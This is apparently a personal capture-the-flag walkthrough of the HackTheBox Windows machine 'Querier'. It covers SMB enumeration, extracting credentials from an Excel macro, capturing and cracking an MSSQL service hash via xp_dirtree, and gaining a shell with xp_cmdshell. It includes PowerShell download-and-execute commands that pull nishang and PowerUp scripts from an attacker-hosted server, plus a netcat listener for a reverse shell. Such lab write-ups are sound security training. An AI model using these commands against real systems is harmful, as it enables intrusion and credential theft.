# HTB : Querier


```toc
```

---
---
---
---

## Machine Information

| Contents      | Description                              |
| ------------- | ---------------------------------------- |
| Name          | HTB : Querier                            |
| Difficulty    | Medium                                   |
| OS            | Windows                                  |
| Shell_Exploit | Responde + msqlclient + smbmap/smbclient |
| Priv_Esc      | PowerUp + psexec                               |
| Miscellaneous | ----                                     |


---
---
---


## Scanning
### Nmap
> - `nmap -sCV -A -vv -p 135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671 -oA nmap/fullscan 10.10.10.125`
> ***OR***
> - `nmap -T4 -A -vv -p 135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671 10.10.10.125`
> > - ![[Pasted image 20221125185413.png]]
> 
> - `snmp 10.10.10.125`
> > - ![[Pasted image 20221125190420.png]]
> 
> ***Product Build Version***
> - ![[Pasted image 20221125185713.png]]
> > - We can search this to get a rough idea about the patches on this box.
> > - Search **17763 Windows**
> > > - ![[Pasted image 20221125190118.png]]
> > > - version = 1809
> > > - *dates = 2018*
> > > > - So any exploit Prior to this we can discard.

---
---
---

## Enumeration
### Web Browser 

#### a. Robots.txt
***N/A***

---

#### b. Source Code
***N/A***

---

#### c. Basic Website Enumerations/Spidering
***N/A***


---
---

### Searchsploit/Online DBs
***N/A***

---
---

### Gobuster Scan
***N/A***

---
---

### Other Enumerations
***SMB Port 445***
> *smbmap command*
> - `smbmap -H 10.10.10.125 -u anonymous`
> > - This should list the shares on that IP address.
> 
> - `smbmap -H 10.10.10.125 -u anonymous -d HTB.local`
> - `smbmap -H 10.10.10.125 -u anonymous -d localhost`
> > - try the 1st command and if it fails the 2nd should work
> > - ![[Pasted image 20221125191454.png]]
> > - This command shows the **Access** as well
> 
> *smbclient command*
> - `smbclient -L \\10.10.10.125\`
> - `smbclient -N -L \\\\10.10.10.125\\`
> > - ![[Pasted image 20221125191210.png]]
> > - We have a **Reports** share thats interesting
> 
> *enumerating the Share*
> - `smbclient -L \\\\10.10.10.125\\Reports` 
> ***OR***
> `smbclient -L //10.10.10.125/Reports`
> `get "Currency Volume Report.xlsm"`
> > - ![[Pasted image 20221125192924.png]]
> > - This is a macro file, .xls**m** gives away that inofrmation.
> > - Always make it a habbit to see the list inside a archive before moving furthur.




---
---
---

## Exploit

### a. Attack Vector
***basic enumeration***
> - `binwalk "Currency Volume Report.xlsm"`
> - `binwalk "Currency Volume Report.xlsm" | grep -o -e "name.*"`
> > - ![[Pasted image 20221125212458.png]]
> 
> - `sudo -H pip install -U oletools[full]`
> > - instaling python-oletools to work with the macro xlsm files.
> 
> - `olevba "Currency Volume Report.xlsm"`
> > - ![[Pasted image 20221125213813.png]]
> > > - Password = PcwTWTHRwryjc$c6
> > > - Username = Reporting
> 
> ***SQL server***
> [How to capture MSSQL credentials with xp_dirtree, smbserver.py | by Mark Mo | Medium](https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478)
> - `impacket-mssqlclient reporting@10.10.10.125 -windows-auth`
> > - ![[Pasted image 20221125214823.png]]
> > - aasd
> 
> ***responder***
> - `responder -I tun0`
> > - Responder logs everything to a fiel called **responder.db**
> > > - ![[Pasted image 20221125225512.png]]
> > 
> > - `sqlite3 Responder.db`
> > > - `.schema`
> > > - `select * from responder;`
> > > - And you will get the output again
> 
> ==OR==
> - `mkdir smb-share`
> - `impacket-smbserver --smb2-support smb-share darkrai`
> - `xp_dirtree "\\10.10.14.13\darkrai\"`
> > - We are trying to steal the hash of this service.
> 
> - `nano pass.txt` *and paste the hash*
> - `john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt pass.txt`
> > - ![[Pasted image 20221125222745.png]]
>
> - `smbmap -u mssql-svc -p corporate568 -d QUERIER -H 10.10.10.125`
> > - ![[Pasted image 20221125230209.png]]
> > - If we had ADMIN access on C then we could have used psexec to gain a shell.

---
---

### b. Mode of Attack
***msqlclient***
> - `impacket-mssqlclient mssql-svc@10.10.10.125 -windows-auth`
> - `enable_xp_cmdshell`
> - `xp_cmdshell whoami`
> > - ![[Pasted image 20221125230704.png]]
> 
> - `nc -lvnp 7799`
> - `python -m http.server`
> - `SQL> xp_cmdshell powershell IEX(New-Object Net.WebClient).downloadString(\"http://10.10.14.13:8000/nishang.ps1\")`
> > - ![[Pasted image 20221125232143.png]]
> 
> - User.txt
> > - ![[Pasted image 20221125232653.png]]


---
---
---

## Priv_Esc

### a. Attack Vector
***PowerUp***
> - `IEX(New-Object Net.WebClient).downloadString('http://10.10.14.13:8000/priv.ps1')`
> > - ![[Pasted image 20221125233945.png]]
> > - ![[Pasted image 20221125234027.png]]

---
---

### b. Mode of Attack
***psexe***
> - `impacket-psexec administrator@10.10.10.125`
> > - ![[Pasted image 20221125234650.png]]